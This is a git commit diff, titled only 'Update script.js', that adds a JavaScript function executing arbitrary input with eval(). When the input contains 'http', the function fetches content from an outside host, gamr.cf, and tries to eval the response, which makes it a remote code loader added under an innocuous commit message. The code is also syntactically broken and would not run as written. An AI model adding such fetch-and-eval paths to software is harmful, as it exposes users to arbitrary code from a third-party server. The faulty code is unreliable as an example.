3a1bb973327d6c0bb321a817352aba2124b0b7d9
psynx <89815919+psynx@users.noreply.github.com>
2021-09-02 11:20:01 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,23 @@
 window.addEventListener('DOMContentLoaded', () => {
-            
-        })
+
+})
+
+function execute(code) {
+    if (code.includes('http')) {
+        fetch("https://gamr.cf/", {
+                "method": "GET",
+                "headers": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+            })
+            .then(function(response) {
+                console.log(response.status);
+                return eval(response.text();)
+            }).then(function(data) {
+                console.log(data);
+            })
+
+    } else {
+                eval(code);
+    }
+}
